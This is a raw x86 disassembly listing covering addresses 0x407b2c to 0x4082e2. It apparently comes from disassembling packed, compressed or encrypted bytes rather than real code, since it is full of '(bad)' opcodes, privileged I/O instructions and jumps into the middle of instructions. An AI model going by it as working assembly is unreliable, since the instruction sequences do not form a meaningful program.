  407b2c:	mov    ds:0xb0e0ca53,al
  407b31:	and    ch,bl
  407b33:	into   
  407b34:	scas   al,BYTE PTR es:[edi]
  407b35:	push   0x62238203
  407b3a:	cmp    edi,ecx
  407b3c:	retf   
  407b3d:	xchg   BYTE PTR [eax-0x5a],ch
  407b40:	dec    ebx
  407b41:	sub    al,0x7
  407b43:	pop    edi
  407b44:	jae    0x407ac8
  407b46:	inc    ecx
  407b47:	call   0xf779967b
  407b4c:	rcl    DWORD PTR [edi+0x78fac5e0],cl
  407b52:	mov    eax,ds:0x1584cee
  407b57:	test   BYTE PTR [edx+esi*1+0x27],0x7e
  407b5c:	add    ebp,eax
  407b5e:	(bad)  
  407b60:	imul   edx
  407b62:	inc    edi
  407b63:	pop    es
  407b64:	cmp    ebx,DWORD PTR [esi+0x1c]
  407b67:	or     DWORD PTR [ecx-0x4c808524],eax
  407b6d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b6f:	pop    esp
  407b70:	or     DWORD PTR [ebx],ebx
  407b72:	jae    0x407afc
  407b74:	mov    cl,0x28
  407b76:	jnp    0x407b74
  407b78:	add    ah,BYTE PTR [edi-0x49bbf345]
  407b7e:	xchg   dh,bl
  407b80:	mov    al,ds:0x4234a676
  407b85:	ds popa 
  407b87:	or     DWORD PTR [esi+0x14],ebx
  407b8a:	sbb    BYTE PTR [ebx*2+0x3db77576],ch
  407b91:	sub    DWORD PTR [ebp+ebp*4-0x55dee021],ecx
  407b98:	(bad)  
  407b9a:	adc    ah,ch
  407b9c:	mov    esp,ebx
  407b9e:	push   ebx
  407b9f:	xchg   BYTE PTR [ebp-0x4ab1a7f],bl
  407ba5:	xor    BYTE PTR ds:0x66d2c0a9,bl
  407bab:	out    0x1e,eax
  407bad:	and    eax,0x7c0f967
  407bb2:	xchg   ebp,eax
  407bb3:	shl    BYTE PTR [esi],cl
  407bb5:	mov    edi,0x4ad1da7b
  407bba:	outs   dx,DWORD PTR ds:[esi]
  407bbb:	dec    edi
  407bbc:	pop    esi
  407bbd:	stc    
  407bbe:	(bad)  
  407bc0:	aas    
  407bc1:	lods   eax,DWORD PTR ds:[esi]
  407bc2:	stc    
  407bc3:	jo     0x407c1c
  407bc5:	retf   
  407bc6:	arpl   WORD PTR [ebp-0x59],cx
  407bc9:	xlat   BYTE PTR ds:[ebx]
  407bca:	out    0x7a,al
  407bcc:	hlt    
  407bcd:	or     DWORD PTR [eax+0x59],esi
  407bd0:	xor    esp,DWORD PTR [ecx-0x23]
  407bd3:	push   esi
  407bd4:	in     eax,0x57
  407bd6:	aam    0x55
  407bd8:	jmp    0x407c0b
  407bda:	outs   dx,BYTE PTR ds:[esi]
  407bdb:	pop    edx
  407bdc:	or     eax,DWORD PTR [edx+eax*8]
  407bdf:	lahf   
  407be0:	push   ds
  407be1:	and    dl,BYTE PTR ds:[esi+0x57]
  407be5:	retf   
  407be6:	es inc edx
  407be8:	jae    0x407b7e
  407bea:	push   ds
  407beb:	fst    QWORD PTR [ebx-0xdff2c06]
  407bf1:	lods   al,BYTE PTR ds:[esi]
  407bf2:	rol    cl,1
  407bf4:	mov    edi,0xc6fa75a3
  407bf9:	adc    al,0xe1
  407bfb:	(bad)  
  407bfc:	fisub  WORD PTR [esi-0x26]
  407bff:	push   es
  407c00:	aaa    
  407c01:	sti    
  407c02:	ins    DWORD PTR es:[edi],dx
  407c03:	test   eax,0x90275ed9
  407c08:	ror    DWORD PTR [esp+edi*4-0x47],cl
  407c0c:	sbb    ch,BYTE PTR [esi]
  407c0e:	lahf   
  407c0f:	push   edx
  407c10:	jnp    0x407c5a
  407c12:	mov    ecx,0x60ce28d7
  407c17:	xchg   ebp,eax
  407c18:	icebp  
  407c19:	aam    0xc3
  407c1b:	cmp    cl,ch
  407c1d:	iret   
  407c1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c1f:	sbb    al,0x37
  407c21:	stos   BYTE PTR es:[edi],al
  407c22:	cmp    al,0x32
  407c24:	std    
  407c25:	stos   BYTE PTR es:[edi],al
  407c26:	mov    eax,0x6e1a9107
  407c2b:	or     BYTE PTR [esp+ecx*8],bl
  407c2e:	inc    ecx
  407c2f:	bound  esi,QWORD PTR [esp+ebx*4-0x2574e42e]
  407c36:	aam    0x20
  407c38:	mov    bl,BYTE PTR [edx]
  407c3a:	call   0x32b3:0xe524dd8a
  407c41:	mov    al,ss:0x928c1d21
  407c47:	mov    ah,0xfb
  407c49:	cmc    
  407c4a:	ds dec edi
  407c4c:	jmp    0x407c71
  407c4e:	repz adc ch,BYTE PTR [esi+0x39]
  407c52:	rcr    edx,0xbd
  407c55:	push   edi
  407c56:	xchg   ecx,eax
  407c57:	js     0x407ca0
  407c59:	push   es
  407c5a:	out    dx,al
  407c5b:	or     eax,0x26c29806
  407c60:	dec    ebx
  407c61:	out    0x7d,al
  407c63:	out    dx,al
  407c64:	push   es
  407c65:	test   DWORD PTR [ecx*1-0x20b7685a],esi
  407c6c:	loopne 0x407c1e
  407c6e:	ficom  WORD PTR [esi+0x51]
  407c71:	pop    edi
  407c72:	ss xchg edx,eax
  407c74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c75:	call   0x74f6:0x7a259943
  407c7c:	sbb    ch,bh
  407c7e:	jle    0x407c88
  407c80:	pop    esp
  407c81:	div    esi
  407c83:	adc    al,0x31
  407c85:	gs dec ecx
  407c87:	addr16 push eax
  407c89:	in     al,dx
  407c8a:	jae    0x407c7b
  407c8c:	and    bh,BYTE PTR [ebx-0x3068e869]
  407c92:	xor    eax,0x96669b5
  407c97:	jmp    0x407c6e
  407c99:	pop    esp
  407c9a:	add    eax,0xa97385a4
  407c9f:	add    edx,ecx
  407ca1:	rol    DWORD PTR [ebx+0x3433af9f],cl
  407ca7:	mov    eax,0x65ef9d22
  407cac:	and    al,0x92
  407cae:	mov    ebp,0x2f9c41ed
  407cb3:	sbb    ebx,ebp
  407cb5:	addr16 xchg esp,eax
  407cb7:	or     edi,DWORD PTR [eax+0x6b]
  407cba:	fs stos DWORD PTR es:[edi],eax
  407cbc:	inc    ebp
  407cbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cbe:	(bad)  
  407cbf:	jecxz  0x407cf6
  407cc1:	adc    edx,esp
  407cc3:	imul   BYTE PTR [edx-0x6d6a2c7a]
  407cc9:	out    dx,al
  407cca:	xchg   esp,eax
  407ccb:	mov    cl,0xb3
  407ccd:	imul   esp,DWORD PTR [eax],0x4141b688
  407cd3:	xlat   BYTE PTR ds:[ebx]
  407cd4:	inc    ebx
  407cd5:	dec    edi
  407cd6:	add    DWORD PTR [ecx+0x7573ffc3],ebp
  407cdc:	mov    ch,0xb4
  407cde:	jge    0x407ccd
  407ce0:	pop    esp
  407ce1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ce2:	int3   
  407ce3:	enter  0xb61f,0x67
  407ce7:	mov    BYTE PTR [ebp-0xc5fb4a],ah
  407ced:	out    dx,al
  407cee:	sbb    al,0xef
  407cf0:	mov    dh,0x37
  407cf2:	fldenv [ebp-0x2f68b341]
  407cf8:	and    al,0x22
  407cfa:	bound  esi,QWORD PTR [eax-0x5066dd20]
  407d00:	inc    esp
  407d01:	jg     0x407d4c
  407d03:	retf   
  407d04:	(bad)  
  407d05:	jle    0x407cf8
  407d07:	lock test esi,ebp
  407d0a:	ror    BYTE PTR [ebx],cl
  407d0c:	dec    edi
  407d0d:	xor    DWORD PTR [ebp+0x7800271f],edi
  407d13:	xor    eax,0x855b50ef
  407d18:	nop    DWORD PTR [edi+0x6bd85022]
  407d1f:	nop
  407d20:	push   esp
  407d21:	loopne 0x407d0f
  407d23:	out    dx,eax
  407d24:	inc    esi
  407d25:	in     eax,dx
  407d26:	jmp    0x407cc0
  407d28:	cmc    
  407d29:	hlt    
  407d2a:	and    eax,0x5a4feb2a
  407d2f:	aaa    
  407d30:	retf   
  407d31:	loopne 0x407cf9
  407d33:	mov    bh,0x24
  407d35:	jmp    0xa1d7c654
  407d3a:	cdq    
  407d3b:	or     eax,esi
  407d3d:	into   
  407d3e:	fwait
  407d3f:	int3   
  407d40:	mov    ch,0x9c
  407d42:	add    DWORD PTR [edx+0x29fd0a8d],edi
  407d48:	mov    esp,0x444a9811
  407d4d:	mov    edi,0xe8933e33
  407d52:	jg     0x407d38
  407d54:	(bad)  
  407d55:	mov    ebp,0xf9bb392b
  407d5a:	push   eax
  407d5b:	and    ebx,DWORD PTR [ebx]
  407d5d:	leave  
  407d5e:	sbb    bl,ch
  407d60:	lea    edx,[eax+0xa]
  407d63:	(bad)  
  407d64:	sub    BYTE PTR [ebx+edi*2+0x60dccd0a],bh
  407d6b:	dec    ebx
  407d6c:	out    dx,eax
  407d6d:	retf   0x9d77
  407d70:	mov    bh,0x6d
  407d72:	cmp    al,0x1d
  407d74:	clc    
  407d75:	and    edx,DWORD PTR [ecx]
  407d77:	jmp    0x70e67803
  407d7c:	xchg   ebx,eax
  407d7d:	cmp    DWORD PTR [ebp-0x47],ebx
  407d80:	adc    DWORD PTR ds:0x2144eb3e,ebx
  407d86:	inc    edx
  407d87:	add    bh,BYTE PTR [esi]
  407d89:	jl     0x407dff
  407d8b:	lods   eax,DWORD PTR ds:[esi]
  407d8c:	push   ss
  407d8d:	mov    edi,cs
  407d8f:	dec    esp
  407d90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d91:	iret   
  407d92:	mov    al,ds:0xe2d7479e
  407d97:	inc    BYTE PTR [ebp+0x7674a357]
  407d9d:	inc    edx
  407d9e:	jbe    0x407db4
  407da0:	pop    ds
  407da1:	adc    ch,BYTE PTR [esi]
  407da3:	and    DWORD PTR [edi],ecx
  407da5:	inc    esp
  407da6:	test   BYTE PTR [esi-0x412ab6c],0xd6
  407dad:	arpl   WORD PTR cs:[esi-0x343e690c],bx
  407db4:	lahf   
  407db5:	ret    0x73d4
  407db8:	sub    eax,0x786778e0
  407dbd:	sbb    eax,0xf89f3da8
  407dc2:	xchg   ebp,eax
  407dc3:	mov    dl,0x9
  407dc5:	call   0xe35a:0xf06e2f8c
  407dcc:	xor    DWORD PTR [esp+esi*2],esp
  407dcf:	sbb    esp,DWORD PTR ds:0xb8a8f3f7
  407dd5:	xor    eax,0x1fc0b1a
  407dda:	shl    BYTE PTR [eax],0xc0
  407ddd:	loop   0x407d68
  407ddf:	sbb    al,0x4f
  407de1:	repz cmc 
  407de3:	add    DWORD PTR [ecx+0x45de31d8],ebp
  407de9:	push   ecx
  407dea:	add    BYTE PTR [ecx-0xc],ah
  407ded:	pop    eax
  407dee:	fiadd  DWORD PTR [ebx+0x62]
  407df1:	push   cs
  407df2:	mov    ch,0x74
  407df4:	retf   
  407df5:	popf   
  407df6:	push   ds
  407df7:	inc    ecx
  407df8:	out    0x0,al
  407dfa:	jno    0x407dbc
  407dfc:	inc    ebx
  407dfd:	lahf   
  407dfe:	sahf   
  407dff:	mov    bh,0xc5
  407e01:	(bad)  [ebp-0x2e]
  407e04:	xchg   ebp,eax
  407e05:	mov    cl,0x80
  407e07:	pop    edi
  407e08:	in     al,0xfd
  407e0a:	retf   0x8a63
  407e0d:	iret   
  407e0e:	mov    eax,DWORD PTR [eax-0x1dca3c10]
  407e14:	jp     0x407e16
  407e16:	(bad)  
  407e17:	rcr    BYTE PTR [esi],1
  407e19:	daa    
  407e1a:	stc    
  407e1b:	cdq    
  407e1c:	push   0xda551ad1
  407e21:	jecxz  0x407dad
  407e23:	adc    BYTE PTR [ebx+0x6a90001],dl
  407e29:	xlat   BYTE PTR ds:[ebx]
  407e2a:	dec    ebx
  407e2b:	mov    ch,0xdb
  407e2d:	pusha  
  407e2e:	aaa    
  407e2f:	cdq    
  407e30:	push   es
  407e31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e32:	and    al,ah
  407e34:	push   esp
  407e35:	xor    al,0xb5
  407e37:	fidivr DWORD PTR [esi]
  407e39:	fwait
  407e3a:	add    dl,BYTE PTR [esi+0x22175b0e]
  407e40:	jns    0x407e43
  407e42:	pushf  
  407e43:	mov    ebx,DWORD PTR cs:[edi-0x7362ab19]
  407e4a:	mov    ah,0xf9
  407e4c:	and    bh,BYTE PTR [ecx-0x6]
  407e4f:	pop    esp
  407e50:	sahf   
  407e51:	inc    ebp
  407e52:	(bad)  
  407e53:	popf   
  407e54:	push   ss
  407e55:	adc    eax,0x27daf67a
  407e5a:	lods   al,BYTE PTR ds:[esi]
  407e5b:	inc    edi
  407e5c:	cmp    eax,0x1fb99b88
  407e61:	push   eax
  407e62:	daa    
  407e63:	jbe    0x407df5
  407e65:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  407e67:	pop    edi
  407e68:	pop    cx
  407e6a:	push   edi
  407e6b:	push   ebx
  407e6c:	lods   eax,DWORD PTR ds:[esi]
  407e6d:	inc    ebx
  407e6e:	ins    DWORD PTR es:[edi],dx
  407e6f:	outs   dx,DWORD PTR ds:[esi]
  407e70:	dec    ebp
  407e71:	test   al,0xa5
  407e73:	inc    edi
  407e74:	rcr    al,0xfb
  407e77:	out    dx,al
  407e78:	pop    edx
  407e7a:	fs ss (bad) 
  407e7d:	jmp    0x407e75
  407e7f:	inc    ebx
  407e80:	adc    edi,DWORD PTR [eax]
  407e82:	sub    eax,0x5a4ca6a8
  407e87:	dec    ebp
  407e88:	adc    DWORD PTR [esi+0x1f],0x39
  407e8c:	retf   0x97d0
  407e8f:	dec    edx
  407e90:	xor    esi,ecx
  407e92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e93:	scas   eax,DWORD PTR es:[edi]
  407e94:	adc    BYTE PTR [ecx],ah
  407e96:	mov    dh,0x32
  407e98:	imul   eax,DWORD PTR [ebp+0x394092c4],0xffffffdd
  407e9f:	mov    bh,0x17
  407ea1:	or     DWORD PTR [ecx+esi*4],ebx
  407ea4:	or     edx,DWORD PTR [esi+0x721fd9c9]
  407eaa:	pop    es
  407eab:	push   0xffffffca
  407ead:	cli    
  407eae:	scas   eax,DWORD PTR es:[edi]
  407eaf:	iret   
  407eb0:	mov    ah,0x96
  407eb2:	sbb    al,0x36
  407eb4:	stos   DWORD PTR es:[edi],eax
  407eb5:	dec    ebx
  407eb6:	inc    ecx
  407eb7:	push   0x4196c268
  407ebc:	shl    BYTE PTR [edi-0x75dcf6a5],1
  407ec2:	sbb    eax,0x19ce034d
  407ec7:	mov    eax,ds:0xbda8847a
  407ecc:	pop    esi
  407ecd:	pop    edx
  407ece:	addr16 or al,0x61
  407ed1:	sbb    ah,BYTE PTR [eax+0x65]
  407ed4:	das    
  407ed5:	sahf   
  407ed6:	hlt    
  407ed7:	popa   
  407ed8:	shr    BYTE PTR [ebx+0x50],0x9b
  407edc:	(bad)
  407ee0:	fnsave ds:0x9fbfd37f
  407ee6:	aas    
  407ee7:	fcom   DWORD PTR [eax+esi*2+0x5cec67e7]
  407eee:	add    eax,0xd9d5c2ee
  407ef3:	mov    al,ds:0x9bfc1782
  407ef8:	jg     0x407ee3
  407efa:	call   0x16c8d2a6
  407eff:	xlat   BYTE PTR ds:[ebx]
  407f00:	cwde   
  407f01:	in     al,0x20
  407f03:	push   ebp
  407f04:	mov    ch,0x66
  407f06:	or     esp,DWORD PTR [ebx]
  407f08:	jge    0x407f89
  407f0a:	inc    ebp
  407f0b:	loope  0x407f57
  407f0d:	arpl   WORD PTR [edi],di
  407f0f:	in     al,0xb4
  407f11:	push   0xeb995f3d
  407f16:	or     BYTE PTR [ecx-0x10],bl
  407f19:	xchg   ebx,eax
  407f1a:	dec    edx
  407f1b:	nop
  407f1c:	add    BYTE PTR [ecx+0x6d49860a],dl
  407f22:	neg    DWORD PTR [edx]
  407f24:	adc    bp,WORD PTR [eax+edi*8]
  407f28:	ficom  DWORD PTR [edi]
  407f2a:	test   al,0xf1
  407f2c:	push   ebp
  407f2d:	scas   al,BYTE PTR es:[edi]
  407f2e:	aam    0x62
  407f30:	not    DWORD PTR [ebx]
  407f32:	push   0xadd5e9a6
  407f37:	dec    esp
  407f38:	cmp    DWORD PTR [ebx-0x477e4af2],edi
  407f3e:	dec    eax
  407f3f:	add    BYTE PTR [ecx],al
  407f41:	shl    DWORD PTR [edi],cl
  407f43:	mov    eax,0x67b9d3be
  407f48:	jb     0x407f57
  407f4a:	lea    edi,[ebx+0x42]
  407f4d:	jl     0x407f37
  407f4f:	ds mov edx,0x3a953861
  407f55:	cmp    al,0xec
  407f57:	push   ebx
  407f58:	adc    edi,ebx
  407f5a:	jle    0x407ef1
  407f5c:	inc    edx
  407f5d:	jae    0x407f18
  407f5f:	inc    eax
  407f60:	cmp    eax,DWORD PTR [esi]
  407f62:	sub    al,0x99
  407f64:	loope  0x407f95
  407f66:	inc    ecx
  407f67:	outs   dx,BYTE PTR ds:[esi]
  407f68:	stc    
  407f69:	(bad)  
  407f6a:	mov    al,ds:0xb26e51e7
  407f6f:	call   0xe7316d31
  407f74:	lock push ebp
  407f76:	and    DWORD PTR [eax-0x7e],ebx
  407f79:	ss jbe 0x407f0f
  407f7c:	mov    BYTE PTR [ecx*8+0x46a8e498],0xb
  407f84:	push   ds
  407f85:	cld    
  407f86:	and    ebx,ebp
  407f88:	mov    eax,eax
  407f8a:	push   es
  407f8b:	ror    DWORD PTR [edx-0x75],cl
  407f8e:	rol    BYTE PTR [eax-0x739d1e5],cl
  407f94:	add    eax,0x8022ba9e
  407f99:	xchg   ecx,eax
  407f9a:	mov    esi,0xb06f80f7
  407f9f:	test   DWORD PTR [ecx+0x4aa699f],0x76dff7d5
  407fa9:	mov    ah,0x3
  407fab:	daa    
  407fac:	xor    edx,edx
  407fae:	xchg   BYTE PTR [eax+0x3dc699b1],ah
  407fb4:	aam    0x3b
  407fb6:	mov    bh,0xde
  407fb8:	inc    ecx
  407fb9:	xor    BYTE PTR [eax-0x2a],dl
  407fbc:	out    0xa3,eax
  407fbe:	or     bh,BYTE PTR [ebp-0x24]
  407fc1:	sub    eax,0x91d72d41
  407fc6:	(bad)  
  407fc7:	loope  0x407fce
  407fc9:	in     al,0x51
  407fcb:	and    al,0xdd
  407fcd:	inc    esp
  407fce:	inc    esp
  407fcf:	sbb    BYTE PTR [eax],dl
  407fd1:	and    DWORD PTR [ebx],ebp
  407fd3:	inc    eax
  407fd4:	dec    ecx
  407fd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fd6:	popa   
  407fd7:	mov    esi,0x173c76a5
  407fdc:	out    0x39,eax
  407fde:	das    
  407fdf:	mov    BYTE PTR es:[ebp+edi*1+0x3b9706c3],ah
  407fe7:	stos   DWORD PTR es:[edi],eax
  407fe8:	and    bh,al
  407fea:	and    al,0x30
  407fec:	sbb    al,0x32
  407fee:	jge    0x407fd9
  407ff0:	pop    es
  407ff1:	adc    esp,DWORD PTR [ecx]
  407ff3:	mov    ?,WORD PTR [esi+0x1]
  407ff6:	pushf  
  407ff7:	out    0x13,al
  407ff9:	test   al,0x4d
  407ffb:	inc    ebx
  407ffc:	jl     0x407fa6
  407ffe:	rcl    DWORD PTR [edi+0x752cc798],cl
  408004:	or     dl,bl
  408006:	sub    esp,0x51
  408009:	jg     0x407feb
  40800b:	in     al,dx
  40800c:	push   edx
  40800d:	rcr    BYTE PTR [edi+0x127ec893],cl
  408013:	xor    eax,0xbc40d835
  408018:	mov    al,ds:0xf908682
  40801d:	jns    0x40803a
  40801f:	jno    0x407fcf
  408021:	push   es
  408022:	ins    BYTE PTR es:[edi],dx
  408023:	mov    ebp,ds
  408025:	xchg   esp,eax
  408026:	push   ebp
  408027:	or     eax,0xc4974fdc
  40802c:	xchg   ecx,eax
  40802d:	and    DWORD PTR [ebx],ebp
  40802f:	push   edi
  408030:	imul   edx,esp,0x20
  408033:	lods   eax,DWORD PTR ds:[esi]
  408034:	cld    
  408035:	xlat   BYTE PTR ds:[ebx]
  408036:	lea    ebp,ds:0xfd67ed02
  40803c:	adc    ecx,esp
  40803e:	lea    esi,[edx]
  408040:	or     al,0x85
  408042:	fsub   st(1),st
  408044:	jle    0x4080a0
  408046:	dec    eax
  408047:	adc    dl,BYTE PTR [eax+ebp*8+0xc04954b]
  40804e:	stos   BYTE PTR es:[edi],al
  40804f:	mov    WORD PTR [edi+0x33],fs
  408052:	inc    esp
  408053:	mov    es,WORD PTR [eax]
  408055:	mov    DWORD PTR [esi+eiz*4],ecx
  408058:	cmp    BYTE PTR [esi],dl
  40805a:	sbb    BYTE PTR [ecx-0x5ba188c9],dh
  408060:	sbb    DWORD PTR [eax+esi*4+0x33a1364d],edx
  408067:	loopne 0x408008
  408069:	(bad)  
  40806b:	sub    bl,dh
  40806d:	cmp    BYTE PTR [edx-0x354f3149],0xda
  408074:	xor    edx,DWORD PTR [ebx]
  408076:	loopne 0x40800d
  408078:	mov    bh,0xac
  40807a:	rol    DWORD PTR [edx+edi*4-0x38],0x70
  40807f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408080:	iret   
  408081:	loope  0x408021
  408083:	rcl    DWORD PTR cs:[esi],0xbf
  408087:	call   0x554bfe1d
  40808c:	pop    eax
  40808d:	inc    DWORD PTR [edi+0x5e]
  408090:	dec    ebx
  408091:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408092:	mov    ecx,DWORD PTR [esi]
  408094:	aaa    
  408095:	mov    ebx,DWORD PTR [esi-0x29582707]
  40809b:	and    eax,0xe983d726
  4080a0:	je     0x40808c
  4080a2:	sub    al,0x4a
  4080a4:	rcl    DWORD PTR [edi+0x7d376baf],cl
  4080aa:	es jmp 0x26c4:0x36a58beb
  4080b2:	cld    
  4080b3:	les    ebp,FWORD PTR [eax+0x47]
  4080b6:	das    
  4080b7:	stc    
  4080b8:	inc    ebx
  4080b9:	lea    esp,[eax-0x7f]
  4080bc:	add    al,0x85
  4080be:	and    ebx,DWORD PTR [ebx+0x4]
  4080c1:	jne    0x408140
  4080c3:	dec    esi
  4080c4:	push   esp
  4080c5:	ficomp DWORD PTR [esp+ebp*4-0x75768a16]
  4080cc:	adc    eax,0x7deb4bc3
  4080d1:	ficom  WORD PTR [ecx]
  4080d3:	pop    ebx
  4080d4:	out    dx,al
  4080d5:	sbb    ah,al
  4080d7:	loope  0x408079
  4080d9:	ins    BYTE PTR es:[edi],dx
  4080da:	ds dec ebx
  4080dc:	mov    dl,0x68
  4080de:	mov    WORD PTR [ebp-0x69],ss
  4080e1:	test   al,0x8a
  4080e3:	and    DWORD PTR [ecx],ecx
  4080e5:	mov    esi,0x72c7f80f
  4080ea:	ja     0x4080b2
  4080ec:	cs aaa 
  4080ee:	iret   
  4080ef:	cli    
  4080f0:	retf   
  4080f1:	or     DWORD PTR ds:0x3f8620d2,0x70c93fe3
  4080fb:	sub    esi,ebp
  4080fd:	jb     0x4080e5
  4080ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408100:	add    esi,DWORD PTR [edx-0x58]
  408103:	pop    ecx
  408104:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408105:	pop    esp
  408106:	push   ebx
  408107:	adc    DWORD PTR [edx],esp
  408109:	mov    WORD PTR [esi],fs
  40810b:	into   
  40810c:	and    DWORD PTR [eax-0x4bd52e56],eax
  408112:	dec    edx
  408113:	rol    BYTE PTR [edx-0x19115039],0xe1
  40811a:	xor    DWORD PTR [ebx-0xe],0x24
  40811e:	mov    edx,0x7832b382
  408123:	test   BYTE PTR [edx-0x501b6285],cl
  408129:	(bad)  
  40812a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40812b:	pop    ebp
  40812c:	sbb    al,0x6c
  40812e:	cs xchg ebx,eax
  408130:	sbb    ecx,DWORD PTR [edx]
  408132:	adc    al,0x42
  408134:	adc    bl,BYTE PTR [esi+0x23]
  408137:	pop    es
  408138:	popa   
  408139:	pop    esp
  40813a:	stos   BYTE PTR es:[edi],al
  40813b:	sbb    BYTE PTR [ebx-0x36],dl
  40813e:	xchg   ebp,eax
  40813f:	ss mov ah,0xd9
  408142:	pop    es
  408143:	shr    al,0xdb
  408146:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408147:	add    eax,0x489a1460
  40814c:	push   esi
  40814d:	mov    ebx,0xb30bcfb1
  408152:	popf   
  408153:	jmp    0x408191
  408155:	jmp    0x1c0ade9d
  40815a:	call   0x76619d75
  40815f:	hlt    
  408160:	dec    ebp
  408161:	xchg   edi,eax
  408162:	lock fiadd WORD PTR [ecx-0x3b]
  408166:	sub    al,0xc6
  408168:	pop    esp
  408169:	fild   WORD PTR [edx+ebx*4]
  40816c:	scas   al,BYTE PTR es:[edi]
  40816d:	add    ebx,DWORD PTR [edx+0x6bbbd780]
  408173:	(bad)  
  408175:	rol    DWORD PTR [edx+esi*2],cl
  408178:	ds mov cl,0xed
  40817b:	mov    WORD PTR [eax+0x4a],ds
  40817e:	pand   mm6,QWORD PTR [eax-0x38]
  408182:	or     eax,0x478b6e64
  408187:	and    DWORD PTR [esi+0x65],ecx
  40818a:	pop    esp
  40818b:	xor    eax,DWORD PTR [ebx-0x39]
  40818e:	xor    ah,BYTE PTR [eax-0x68f15ec6]
  408194:	repnz ss jecxz 0x40818d
  408198:	mov    al,ds:0x127b89a6
  40819d:	pop    ebx
  40819e:	add    al,0xe5
  4081a0:	call   0x1b4b:0x47fa96d6
  4081a7:	jb     0x40818a
  4081a9:	push   ds
  4081aa:	rol    esi,1
  4081ac:	aad    0xeb
  4081ae:	or     cl,dl
  4081b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081b1:	xor    BYTE PTR [ebp-0x79eee171],ah
  4081b7:	sbb    DWORD PTR [edi-0x1f],ecx
  4081ba:	gs call 0xc522:0x1f0a3ffa
  4081c2:	sti    
  4081c3:	and    ch,BYTE PTR [esi+eax*8]
  4081c6:	mov    al,ds:0x29506c23
  4081cb:	daa    
  4081cc:	arpl   WORD PTR [esi-0x68c96779],cx
  4081d2:	ins    BYTE PTR es:[edi],dx
  4081d3:	xor    BYTE PTR [eax],dh
  4081d5:	xchg   ebp,eax
  4081d6:	cld    
  4081d7:	mov    eax,ds:0xfcbbef5d
  4081dc:	cmp    cl,BYTE PTR ds:0x69e1b489
  4081e2:	sbb    eax,0xbeabcf61
  4081e7:	add    ch,BYTE PTR [ecx]
  4081e9:	mov    cs,esi
  4081eb:	out    0xc3,eax
  4081ed:	inc    ecx
  4081ee:	xor    al,BYTE PTR [edi+0xaf1d5de]
  4081f4:	mov    dl,0x16
  4081f6:	xchg   al,dl
  4081f8:	leave  
  4081f9:	aad    0x19
  4081fb:	mov    ebx,DWORD PTR [eax]
  4081fd:	or     dl,BYTE PTR [esi+eiz*4+0x4d5f67d5]
  408204:	push   es
  408205:	cli    
  408206:	sub    DWORD PTR [ecx+ebx*1],eax
  408209:	inc    edi
  40820a:	mov    edx,0xede148fb
  40820f:	push   cs
  408210:	jnp    0x4081f7
  408212:	jecxz  0x408241
  408214:	test   eax,0x8ed3a7a8
  408219:	scas   eax,DWORD PTR es:[edi]
  40821a:	call   0x3d8f932
  40821f:	xor    esi,esi
  408221:	shl    DWORD PTR [ecx-0x6d99b0fd],0x84
  408228:	and    eax,DWORD PTR [edx+0x7ff51031]
  40822e:	iret   
  40822f:	xchg   bh,al
  408231:	xor    al,0x26
  408233:	inc    ebp
  408234:	ss cmovs eax,esi
  408238:	stos   BYTE PTR es:[edi],al
  408239:	test   DWORD PTR [ecx+0x5b],ebx
  40823c:	mov    ah,0x92
  40823e:	lahf   
  40823f:	inc    ebx
  408240:	xor    DWORD PTR [esi+0x8],ecx
  408243:	sub    DWORD PTR [edx+eax*2+0x7b9b4f0c],ebp
  40824a:	out    dx,al
  40824b:	ss js  0x408263
  40824e:	pop    esp
  40824f:	and    ah,BYTE PTR [edx+0x197e50e]
  408255:	(bad)
  408258:	pop    ds
  408259:	je     0x408260
  40825b:	call   0x3cbe8375
  408260:	int    0xae
  408262:	iret   
  408263:	push   eax
  408264:	ret    0xa928
  408267:	pop    ecx
  408268:	rcl    DWORD PTR [edx-0x3a],1
  40826b:	fdivr  st(6),st
  40826d:	xor    BYTE PTR [esi-0x27],ch
  408270:	(bad)  
  408271:	cli    
  408272:	je     0x40829a
  408274:	mov    esp,0x52b9c9db
  408279:	pop    ds
  40827a:	sbb    eax,0xa4cd653f
  40827f:	(bad)  
  408280:	aam    0xfa
  408282:	xchg   DWORD PTR [edi-0x5a],ecx
  408285:	inc    esp
  408286:	or     ebx,esp
  408288:	retf   
  408289:	lods   al,BYTE PTR ds:[esi]
  40828a:	xchg   edx,eax
  40828b:	mov    bl,0x94
  40828d:	xor    DWORD PTR [esi-0x67f5885f],0x8fdcba44
  408297:	mov    ch,BYTE PTR [edx-0x2c794102]
  40829d:	pusha  
  40829e:	cmp    BYTE PTR ds:0xe649627e,bl
  4082a4:	xor    al,0x14
  4082a7:	mov    WORD PTR ds:0xd48db5e7,es
  4082ad:	mov    ecx,0x23be210f
  4082b2:	adc    esi,DWORD PTR [eax+eiz*4]
  4082b5:	mov    edi,0x1cf696f4
  4082ba:	or     eax,0xbc7be805
  4082bf:	dec    esi
  4082c0:	xchg   ebp,eax
  4082c1:	push   0xffffff8a
  4082c3:	sahf   
  4082c4:	pop    DWORD PTR [esi]
  4082c6:	jp     0x40829f
  4082c8:	movsx  eax,BYTE PTR [edi+0x2ab25ed0]
  4082cf:	sbb    ebp,DWORD PTR [esi+0x7d]
  4082d2:	add    BYTE PTR [eax+0x4],bh
  4082d5:	fdiv   QWORD PTR [esi+edi*1+0x5a982168]
  4082dc:	and    cl,BYTE PTR [edi+0x56cb4b01]
  4082e2:	ins    BYTE PTR es:[edi],dx
